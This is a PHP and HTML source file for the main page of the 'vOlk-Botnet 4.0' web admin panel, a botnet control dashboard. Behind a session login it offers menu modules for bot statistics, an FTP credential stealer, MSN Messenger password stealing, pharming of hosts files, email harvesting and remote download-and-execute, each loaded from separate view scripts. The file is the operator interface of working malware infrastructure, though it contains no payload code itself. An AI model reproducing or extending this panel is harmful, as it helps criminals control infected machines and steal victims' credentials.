<?php
@session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ./");  exit() ; }	
require_once("includes.php");
?>
<?php
function UrlServidor(){
	$Self = str_replace("index.php" , "" , $_SERVER['PHP_SELF']) ;
	$Host = $_SERVER['HTTP_HOST']  ;
	return $Host . $Self ;
}
$_SESSION['UrlServidor'] = UrlServidor();
?>
<html>
<head>
<meta http-equiv="Content-Language" content="es">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>[vOlk-Botnet] 4.0</title>
<style>
body { background-color:#303030; font-family:Helvetica,Arial,Sans-serif; }
</style>
<script type="text/javascript" src="archivos/js/jquery.js"></script>
        <script type="text/javascript" src="archivos/js/funciones.js"></script>
        <script type="text/javascript" src="archivos/js/ajax.js"></script>
<link REL="shortcut icon" HREF="./archivos/imagen/favicon.ico"> 
<style type="text/css">
<!--
.Estilo1 {
	color: #FFFFFF;
	font-size: 12px;
}
-->
</style></head>
<body background="archivos/imagen/bg.gif">
<div align="center">

<br>
<br>
&nbsp;<table width="864" height="100" style="border:1px solid #555555;" bgcolor="#191919" background="archivos/imagen/bg.gif">

<tr>
<td align="center" valign="top" background="archivos/imagen/bg.gif" width="490">
<p align="left"><a  style="float:left; ">
<img src="archivos/imagen/4_03.jpg" border="0" width="336" height="85"></a></td>
<td align="center" valign="top" background="archivos/imagen/bg.gif" width="362"><a href="./" onClick="Salir();" style="float:right;"><font face="Verdana" size="1" color="#B8B8B8"><img border="0" src="archivos/imagen/delete.png" width="16" height="16"></font><font face="Verdana" size="1" color="#E10000"><br>
Logout</font><font face="Verdana" size="1" color="#B8B8B8"> </font></a></td>
</tr>


<tr><td width="856" colspan="2"><br>
<table width="99%" height="91" align="center" bgcolor="#000" style="border:1.5px solid #808080;">
  <tr>
    <td valign="top">&nbsp;</td>
    <td valign="top"><div align="center" class="Estilo1">
      <div align="center">About's</div>
    </div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Statistics</span></div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Stealer FTP </span></div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Pharming</span></div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Visit Webpage</span></div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Msn Stealer</span></div></td>
    <td valign="top"><div align="center" class="Estilo1">
      <div align="center">Download</div>
    </div></td>
    <td valign="top"><div align="center"><span class="Estilo1">Settings</span></div></td>
    <td valign="top"><div align="center" class="Estilo1">Server Time</div></td>
  </tr>
  <tr>
  <td width="3%" height="63" valign="top">&nbsp;</td> 
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Inicio.php', 'div_ajax'); return false;" title='Inicio' style="text-decoration: underline; color: white">
	<img src="archivos/b-findrep.png" alt="Home Bots" width="65" height="65" longdesc="Manul vOlk" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Estatus.php', 'div_ajax'); return false;" title='Estadisticas de los Bots' style="text-decoration: underline; color: white">
	<img src="archivos/b-statistics.png" alt="Estadisticas" width="65" height="65" longdesc="Zombis Whois" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Filezilla.php', 'div_ajax'); return false;" title='Estadisticas de los Bots' style="text-decoration: underline; color: white">
	<img src="archivos/b-ftp.png" alt="Ftp Cliente" width="65" height="65" longdesc="Ftp Log Stealer" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Host.php', 'div_ajax'); return false;" title='Pharming' style="text-decoration: underline; color: white">
	<img src="archivos/b-pharming.png" alt="Pharming" width="65" height="65" longdesc="Pharming Hosts" border="0"></a></div></td>
   <td width="10%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Explorer.php', 'div_ajax'); return false;" title='E-MailList' style="text-decoration: underline; color: white">
	<img src="archivos/b-firefox.png" alt="E-MailList" width="65" height="65" longdesc="E-MailList" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Messenger.php', 'div_ajax'); return false;" title='Messenger' style="text-decoration: underline; color: white">
	<img src="archivos/b-msnpasw.png" alt="Messenger" width="65" height="65" longdesc="Messenger Stealers" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Exe.php', 'div_ajax'); return false;" title='Downloader' style="text-decoration: underline; color: white">
	<img src="archivos/b-downloader.png" alt="Download" width="65" height="65" longdesc="Download Execute" border="0"></a></div></td>
   <td width="8%" valign="top"><div align="center"><a href="#" onClick="ajax_load('Vistas/Configs.php', 'div_ajax'); return false;" title='Configuracion' style="text-decoration: underline; color: white">
	<img src="archivos/b-settings.png" alt="Settings" width="65" height="65" longdesc="Settings" border="0"></a></div></td>
   <td width="24%" valign="top"><table width="117" height="51" align="center" cellpadding="0" cellspacing="0">
	<!-- MSTableType="layout" -->
	<tr>
		<td width="112" height="33"><div align="center">
		  <?php require_once('Vistas/iclok.php'); ?>
		</div>		  </td>
	</tr>
</table></td>
</tr>
</table></td></tr>


<tr>
  <td height="10"  id='bstat' title="Bots Online y todos los bots" valign="top" align="center" width="856" colspan="2"><?php require_once 'Vistas/frm_stat-qview.php'; ?></td>
  
</tr>
<tr><td height="10" width="856" colspan="2">&nbsp;</td>
</tr>





<tr><td align="center" id="div_ajax" width="856" colspan="2">

</td></tr>
<tr><td height="10" width="856" colspan="2">&nbsp;</td>
</tr>
  </table>
    

   <font face="Verdana" size="1" color="#FFFFFF">[byvOlk] - WebAdmin Panel &reg; vOlk-Botnet 
4.0 </font></div>

</body>

</html>